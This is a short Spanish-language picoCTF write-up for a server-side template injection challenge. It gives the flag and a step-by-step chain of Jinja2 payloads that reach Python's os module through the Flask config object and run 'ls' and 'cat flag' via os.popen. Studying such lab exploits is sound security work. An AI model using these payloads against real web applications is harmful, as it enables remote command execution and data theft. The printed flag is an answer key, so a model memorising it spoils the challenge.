
## **Descripcion**
Help us test the form by submiting the username as `test` and password as `test!` The website running [here](http://saturn.picoctf.net:61821/).
## **Solucion**
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
## **Notas adicionales**
Se hizo uso de la inyeccion  Jinja2 dejo los comandos siguientes que se usaron

```
{{4*4}}

- Obtenemos la class del objeto config. En aplicaciones flask, config es típicamente una instancia de Config la cual hereda de una clase base
  {{ config.__class__ }}

- Accedemos al método _init_ de la clase Config:
  {{ config.__class__.__init__ }}

- Extramos las variables globales disponibles en el ámbito de la función _init_. Esto a menudo incluye módulos de Python integrados como os, que es la clave para la ejecución del comando:
  {{ config.__class__.__init__.__globals__ }}

- Accedemos al modulo os desde el ámbito global:
  {{config.__class__.__init__.__globals__['os']}}

- Se utiliza os.popen() para ejecutar comandos de shell
  popen('ls').read()

  {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}

 {{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
```
# **Referencias**
https://onsecurity.io/article/server-side-template-injection-with-jinja2/
picoCTF 2025 - [ Web Explotation ] - SSTI1 https://youtu.be/qji8Wp0-1Rs?si=rK1EiHTF93ssyMtF